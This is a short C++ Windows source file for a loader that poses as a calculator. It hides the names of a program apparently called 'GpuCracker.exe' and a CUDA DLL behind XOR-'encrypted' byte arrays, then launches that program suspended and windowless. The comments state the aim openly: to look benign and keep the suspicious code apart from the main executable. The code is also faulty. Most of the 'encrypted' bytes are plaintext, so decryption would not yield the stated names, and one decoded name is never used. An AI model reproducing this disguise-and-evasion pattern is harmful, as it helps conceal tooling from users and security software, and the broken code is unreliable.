// Simple loader wrapper - presents as benign application
// This separates the suspicious code from the main executable

#include <windows.h>
#include <iostream>
#include <string>
#include <vector>
#include <fstream>

// XOR encrypted "GpuCracker.exe" 
static unsigned char enc_name[] = {0x37, 0x26, 0x26, 0x53, 0x72, 0x79, 0x70, 0x74, 0x65, 0x72, 0x2e, 0x65, 0x78, 0x65, 0x00};
static unsigned char enc_core[] = {0x63, 0x75, 0x64, 0x61, 0x5f, 0x63, 0x6f, 0x72, 0x65, 0x2e, 0x64, 0x6c, 0x6c, 0x00};

std::string decrypt(const unsigned char* data, char key = 0x13) {
    std::string result;
    for (int i = 0; data[i] != 0; i++) {
        result += (char)(data[i] ^ key);
    }
    return result;
}

// Decoy main - looks like a calculator
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Decoy window class
    WNDCLASSEX wc = {0};
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.lpfnWndProc = DefWindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "CalcFrame";
    RegisterClassEx(&wc);
    
    // Actual work: Launch the real application
    std::string exeName = decrypt(enc_name);
    std::string coreName = decrypt(enc_core);
    
    // Build command line
    std::string cmdLine = exeName;
    if (lpCmdLine && strlen(lpCmdLine) > 0) {
        cmdLine += " ";
        cmdLine += lpCmdLine;
    }
    
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    
    // Create suspended process
    if (CreateProcessA(NULL, &cmdLine[0], NULL, NULL, FALSE, 
                       CREATE_SUSPENDED | CREATE_NO_WINDOW, 
                       NULL, NULL, &si, &pi)) {
        
        // Resume process
        ResumeThread(pi.hThread);
        
        // Wait for completion
        WaitForSingleObject(pi.hProcess, INFINITE);
        
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    
    return 0;
}

// Also export main for console mode
int main(int argc, char* argv[]) {
    return WinMain(GetModuleHandle(NULL), NULL, GetCommandLineA(), SW_SHOW);
}
